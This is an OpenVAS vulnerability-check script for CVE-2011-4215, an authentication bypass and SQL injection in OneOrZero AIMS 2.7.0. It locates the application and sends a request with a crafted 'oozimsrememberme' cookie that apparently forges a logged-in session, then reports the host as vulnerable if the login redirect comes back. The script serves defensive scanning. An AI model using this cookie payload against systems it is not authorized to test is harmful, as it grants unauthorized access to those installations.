###############################################################################
# OpenVAS Vulnerability Test
#
# OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103304");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-10-18 13:33:12 +0200 (Tue, 18 Oct 2011)");
  script_cve_id("CVE-2011-4215");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("OneOrZero AIMS Security Bypass and SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50107");
  script_xref(name:"URL", value:"http://en.securitylab.ru/lab/PT-2011-20");
  script_xref(name:"URL", value:"http://en.securitylab.ru/lab/PT-2011-21");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/800227");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"OneOrZero AIMS is prone to a security-bypass vulnerability and an SQL-
  injection vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to bypass certain security
  restrictions, perform unauthorized actions, bypass filtering, and modify the logic of SQL queries.");

  script_tag(name:"affected", value:"OneOrZero AIMS 2.7.0 is affected. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit(0);

foreach dir( make_list_unique( "/ooz", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( "Powered by OneOrZero" >< buf ) {

    host = http_host_name( port:port );

    req = string("GET ", url, " HTTP/1.1\r\n",
                 "Host: ", host,"\r\n",
                 "Cookie: oozimsrememberme=eJwrtjI0tlJKTMnNzMssLilKLMkvUrJ29PQNBgBsjwh2;\r\n",
                 "\r\n\r\n" );
    res = http_keepalive_send_recv( port:port, data:req );

    if("Location: ?controller=launch" >< res) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
